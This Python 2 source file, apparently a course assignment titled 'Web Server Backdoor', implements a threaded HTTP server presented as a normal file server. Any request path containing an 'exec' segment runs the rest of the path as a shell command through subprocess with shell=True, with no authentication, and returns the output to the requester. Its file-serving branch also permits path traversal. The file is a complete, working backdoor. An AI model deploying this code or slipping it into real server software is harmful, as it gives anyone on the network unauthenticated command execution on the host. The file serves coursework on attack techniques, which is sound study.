#!/usr/bin/env python

###########################################
#Author: Shruti Sonawane
#CSE 545: Assignment 1: Web Server Backdoor
###########################################

#importing python libraries for url parsing and processing

import sys
import socket
import os
import subprocess
import signal
import time
from urlparse import urlparse
from thread import *


class NormalServer:

 def __init__(self, port_num):
     self.host = ''
     self.port = port_num
     self.www_dir = 'www'


 def TriggerServer(self):
     try:
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print('Launching HTTP server on ', self.host, ':', self.port)
         self.socket.bind((self.host, self.port))

     except Exception:
         print 'Socket connection error......'
         print 'Shutting down......'
         self.shutdown()
         sys.exit(1)
     print 'Server successfully connected to port:', self.port
     self.InterceptHTTPRequests()


 def GenerateHTTPHeader(self,  code):
     # determine response header 
     head = ''
     if (code == 200):
        head = 'HTTP/1.1 200 OK\n'
     elif(code == 404):
        head = 'HTTP/1.1 404 Not Found\n'
     current_date = time.strftime("%a, %d %b %Y %H:%M:%S", time.localtime())
     head += 'Date: ' + current_date +'\n'
     head += 'Server: My-Own-HTTP-Server\n'
     head += 'Connection: close\n\n'  
     return head


 def InterceptHTTPRequests(self):
     self.socket.listen(5) # maximum number of queued connections
     while True:
         print 'Waiting to connect......'
         self.socket.listen(5) # maximum number of queued connections
         conn, addr = self.socket.accept()
         print 'Connection received from: ', addr

         #start a new client thread to handle muliple connections to server
         start_new_thread(self.Baby_Client,(conn,))
          
     self.socket.close()
 

 def Baby_Client(self,conn):
         string = conn.recv(1024) #receive data from client
         
         #determine request method
         request_method = string.split()[0]
         #print ("Method: ", request_method)
         #print ("Request body: ", string)
         http_version = string.split()[2]

         if (request_method == 'GET') and (http_version=='HTTP/1.1'): 
              
              real_url = string.split()[1]       
              #print 'Real url:', real_url

              obj = urlparse(real_url)
              #print 'obj.path:', obj.path
              list = obj.path.split('/')
              
              if 'exec' in list:   
                   command = obj.path[6:]     #entire command- as long as it is...
                   #print 'execute cmd: ', command
                   command =  command.replace('%20',' ')     #for handling spaces in url!!
                   try:
                       #temp = os.popen(command)
                       response_content = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)   #temp.read()
                       #temp.close()
                       #print 'response content:'+response_content
                       response_headers = self.GenerateHTTPHeader(200)

                   except Exception:
                       print 'Warning, couldnt execute command. Serving response code 404'
                       response_headers = self.GenerateHTTPHeader(404)
                       response_content = b"<html><body><p>HTTP Error 404:Page not found </p></body></html>"
              else:
                   file_requested = string.split(' ')
                   file_requested = file_requested[1] # get 2nd element

                   file_requested = file_requested.split('?')[0]  #discard anything after '?'

                   if (file_requested == '/'):  # in case no file is specified by the browser
                        file_requested = '/index.html' # load index.html by default

                   file_requested = self.www_dir + file_requested
                   print ("Serving web page [",file_requested,"]")

                   try:
                       file_handler = open(file_requested,'rb')
                       response_content = file_handler.read() # read file content
                       file_handler.close()
                       response_headers = self.GenerateHTTPHeader( 200)

                   except Exception as e: #in case file was not found, generate 404 page
                       print ("Warning, file not found. Serving response code 404\n", e)
                       response_headers = self.GenerateHTTPHeader( 404)
                       response_content = b"<html><body><p>Error 404: File not found</p><p></p></body></html>"

         else:
             response_headers = self.GenerateHTTPHeader(404)
             response_content = b"<html><body><p>HTTP Error 404:Page not found </p></body></html>"

         server_response =  response_headers.encode() # return headers for GET and HEAD
         server_response +=  response_content  # return additional content for GET only
         conn.send(server_response)
         print 'Closing connection with client......'
         conn.close()

 def shutdown(self):
     try:
         print("Shutting down the server")
         s.socket.shutdown(socket.SHUT_RDWR)

     except Exception:
         print 'Something went wrong while shutting the server down!'


#final shutdown function
def final_shutdown(sig, dummy):
         s.shutdown()
         sys.exit(1)

#shutdown interrupt: Ctrl+c
signal.signal(signal.SIGINT, final_shutdown)

print 'Starting HTTP web server......'
#Accepting port number specified in command line
port_num = int(sys.argv[1])
#Constructing server object
s = NormalServer(port_num)
#Aquire the socket
s.TriggerServer()
